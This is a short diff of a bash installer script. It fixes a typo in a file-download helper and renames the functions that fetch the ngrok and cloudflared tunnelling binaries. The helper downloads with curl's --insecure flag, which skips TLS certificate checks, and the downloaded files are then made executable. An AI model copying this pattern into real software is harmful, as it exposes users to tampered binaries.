@@ -47,7 +47,7 @@ download() {
 	output="$2"
 	file=`basename $url`
 	if [[ -e "$file" || -e "$output" ]]; then
-		rm1 -rf "$file1" "$output1"
+		rm -rf "$file" "$output"
 	fi
 	curl --silent --insecure --fail --retry-connrefused \
 		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"
@@ -273,10 +273,10 @@ echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   --------------------
 echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;93m  !!         Download Link Services         !!\e[0m'
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
 echo ""
-setup_ngrok
+install_ngrok
 rm -rf ngrok-v3*.tgz
 echo ""
-setup_cloudflare
+install_cloudflared
 mv cloudflared-li* cloudflared
 chmod +x cloudflared ngrok
 ls
